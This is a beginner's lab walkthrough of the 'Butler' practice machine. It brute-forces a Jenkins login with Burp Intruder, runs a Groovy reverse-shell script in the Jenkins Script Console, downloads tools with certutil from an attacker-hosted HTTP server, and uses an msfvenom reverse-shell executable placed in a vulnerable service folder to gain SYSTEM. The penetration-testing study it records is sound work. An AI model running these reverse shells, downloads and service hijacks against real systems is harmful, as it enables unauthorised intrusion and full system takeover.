![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/logoo.jpg)

# Butler


This is the third machine that i've done.it really took so much time because of Lag issues because i'm using a low end device for this.

Anway let's start by finding the IP Address of the target machine you can do that by using `netdiscover` 

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/netdiscover.png)

Okay we got it it's `192.168.57.10`
## Scanning

Now let's do an nmap scan.

```

$ nmap -T4 -p- -A [IP of butler]

-T4: Sets the timing template to 4, making the scan faster but a bit noisier.
-p-: Scans all 65,535 ports.
-A: Enables aggressive scan options, like OS detection, version detection, script scanning, and traceroute.
```
## Results

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
63108/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:84:1E:90 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:84:1e:90 (Oracle VirtualBox virtual NIC)
| Names:
|   WORKGROUP<00>        Flags: <group><active>
|   BUTLER<00>           Flags: <unique><active>
|_  BUTLER<20>           Flags: <unique><active>
| smb2-time: 
|   date: 2024-08-16T19:50:46
|_  start_date: N/A
|_clock-skew: 12h30m02s


```

Okay we found some interesting things to look at :

- `135/tcp   open  msrpc         Microsoft Windows RPC`

 - `139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn`

 - `445/tcp   open  microsoft-ds?`
- `5040/tcp  open  unknown`

- `7680/tcp  open  pando-pub?`

- `8080/tcp  open  http          Jetty 9.4.41.v20210516`

- `| http-robots.txt: 1 disallowed entry `

```
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
63108/tcp open  msrpc         Microsoft Windows RPC
```
And it is running a `Windows 10 OS`


## Enumerating http

Let's check the `http` **web service**:

```
http://192.168.57.10:8080
```

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/jenkins.png)

It's a login page for `Jenkins` (An Open source Automation Server)

Now we don't know the user name & password.

let's try to find it using Default usernames and names related to this login page for that we will be performing a bruteforce attack now you can do this in many ways.

You can use these also :

- Hydra
- Medusa
- Metasploit
- Burp suite

## Bruteforcing


Let's try with `Burp suite`.
### Proxy Setup
Turn on your `proxy` settings for Burp suite
You can do it manually by going in to the Browser settings **(Mozilla Firefox)** in the settings > search for proxy and configure your proxy to manual > set the ip as `127.0.0.1` and that's it then type some values in to the `username` and `password` box .

There is also an extension for doing this in an easy way so you don't have to do this every time
you can find it [**here**](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)  for firefox and click [**here**](https://chromewebstore.google.com/detail/foxyproxy/gcknhkkoolaabfmlnjonogaaifnjlfnp?hl=en) for Chrome

Turn on `Intercept` for Intercepting the request from the browser.


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/burp1%20req.png)

Now send it to the `Intruder` go to the `Intruder` tab

Select the **position** of the `username` and click on `Add$` on the top,do the same for the `password` we are doing this to use these section for a wordlist and do a pair matching against **username & password**.

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/brute.png)

Change the Attack type to `Cluster Bomb`

Now in the `Payload Section` set the **Payload set 1** to known `username` that you think will be the **username** we are basically guessing.
We can type as 
- Jenkins
- jenkins
- user
- admin
- Administartor
- password
- Password
- root
 
Now Set the **Payload set 2** which is going to be for the `password` section.I'll just type the same as i've done for the users.

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/brutepayload.png)

Now you can start the Attack by Clicking `Start Attack`

Now while it's running check for length differences. let's say that you are running this and you are getting the length `700` as a sequence and then all of a sudden that length decreases to some `400`. now thats a good sign because it might be saying that we can authenticate with the credentials we found in that row.(Means that `Successful Login`) 


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/burp%20result.png)

we can see that at first i used to get the length as `316` and then suddenly it got decreased to `182` 

Now the status code `302` might indicate that our login has been `Successful` and we are being redirected to another page besides login.

So we a the **username** as `jenkins` and the **password** as `jenkins`

We can now login to the `jenkins` page with this credentials

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/loggined.png)

Now in the left side there is **Manage Jenkins**
click on that and we will see a **dashboard**

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/dashboard.png)

Now there is a `command line shell` also contains the commands we can use on them

Next to it we see `Script Console` which is interesting we know that it needs groovy script to execute. we can search for `groovy script` which will give us a `reverse shell`.

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/sciprt%20console.png)


I found this [**here**](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/groovyscript.png)

### The Groovy Script

```
String host=”localhost”;
int port=8044;
String cmd=”cmd.exe”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Change the host to your  **Attacker machine IP**
Change the port to something i'll use `2222`

Now copy the **modified** `groovy script` and paste it in the `Script Console` don't hit run right away.
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/scirpt%20insert.png)

First we need to setup a listener using `netcat` on port `2222`.
```
nc -nvlp 2222
listening on [any] 2222 ...

```

Now hit **`Run`**

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/netcat%20shell.png)

And **TADA** ! we got a shell !

Okay we still are'nt the High authority of this machine so we're going to be performing `privilege escalation` methods.

## Privilege Escalation 

Let's use the **WinPEAS** which is the windows version of **linPEAS** you can find it [**here**](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1)

Download the `winPEASx64.exe` and move it to the **folder** where you want to **host** it.

```
Hey Organizing is a good habit
```

Start `http.server` using `python3` type this in the folder where you want to host It.

```
python3 -m http.server 80

```

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/server%20python3.png)

Now we have our http server running all we have to do now is download this `winPEASx64.exe` to the **Windows machine**

Now on the **Shell** we got
Go into any folder where you can have files to run (Desktop, Downloads, Or any User Profile) and then type :

```
$ certutil.exe -urlcache -f http://yourip:80/winPEASx64.exe winpeas.exe

--------------------------------------------------------------------------------------------
certutil.exe: A built-in Windows utility primarily used for managing certificates, but it can also be used for downloading files.

-urlcache: This flag tells certutil to interact with the URL cache, which can be used to download files from a URL.

-f: This forces the command to overwrite the file if it already exists.

http://yourip:80/winPEASx64.exe: This is the URL from which the file is being downloaded. Replace yourip with the actual IP address of the server hosting the file.

winpeas.exe: The name you want to save the downloaded file as on the local system.
```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/uplaoding.png)

Okay you can now stop the `http server`in your Attacker Machine.

Doing this shit was dope felt like **`Mr.robot`** for a sec.

Okay now **run** the `winpeas.exe`

```
winpeas.exe
```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/winPeas.png)

And damn it gives a lot of information about the machine

we found some **vulnerable services** running in the machine.

(I don't exactly understand how this vulnerable service can be happened may be some mis configuration right.I need to learn about that actually)

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/vulnerable%20service.png)

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/eccc88193936f40f1b4df30decf282f79da1fa82/Butler/images/vulnerable%20service%202.png)

what if try to create a payload or malware and we  put that inside the running services main folder so it will also run and we'll get a shell back.

### Payload


So let's create a payload using `msfvenom`

```
$ msfvenom -p  windows/x64/shell_reverse_tcp lhost=[us] lport=7777 -f exe > Wise.exe

------------------------------------

Msfvenom is a tool in Metasploit for creating custom payloads to exploit vulnerabilities.

--------------------------------------------------

$ msfvenom: This is the command to run the tool.

-p windows/x64/shell_reverse_tcp: -p specifies the payload type. Here, it creates a reverse shell for a 64-bit Windows system.

lhost=[us]: lhost is the local host IP address where the payload will connect back. Replace [us] with your IP.

lport=7777: lport is the local port number that the payload will use to connect back.

-f exe: -f specifies the format of the output file, which is exe in this case (a Windows executable).

> Wise.exe: This redirects the output to a file named Wise.exe, which will be your payload.

```

Okay the payload is created and saved as `Wise.exe`

Let's start a `http server` in the folder right were our `Wise.exe` is present.

```
python3 -m http.server 80
```
Okay it has started !

## Getting Root

Open a new Terminal and setup a listener on port 7777(Change it with your port)

```
nc -nvlp 7777
listening on [any] 7777 ...
```


Now head back to the **shell** we have and go the location or folder where the **Vulnerable service** is running and upload your Payload **(Wise.exe)**

`Program Files (x86)\Wise\`

you can do that by :

```
certutil -urlcache -f http://yourip:80/Wise.exe Wise.exe
```

Do not run it !

What is happening here ?

if we run it,it will run as a **regular user** 
we need to stop the running `vulnerable` service which we found `wise boot assistant`

To stop the vulnerable service type :

```
sc stop WiseBootAssistant

sc: The command to manage Windows services.

stop: The action to stop the service.

WiseBootAssistant: The name of the service you want to stop.

```

To check the status of the service :

```
sc query WiseBootAssistant

sc query: Checks the status of a service.

```
Now we need to restart the service :

```
sc start WiseBootAssistant

sc start: Starts a service.

```

Before
------


Before the vulnerable service was running by default the system would check and run files in that service folder

After
-----

Now we have put the payload "Wise.exe" in the wise folder so what will happen is that the system will check for executables in the path of the Wise folder and run it.

Now go back to the listener to see if we got a shell !

`And yes yes we have !`


```
nc -nvlp 7777
listening on [any] 7777 ...
connect to [192.168.xx.xx] from (UNKOWN) [192.168.57.10] 
Microsoft windows [Version 10.0.19043.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system    

```

```
4 done 2 to go
```








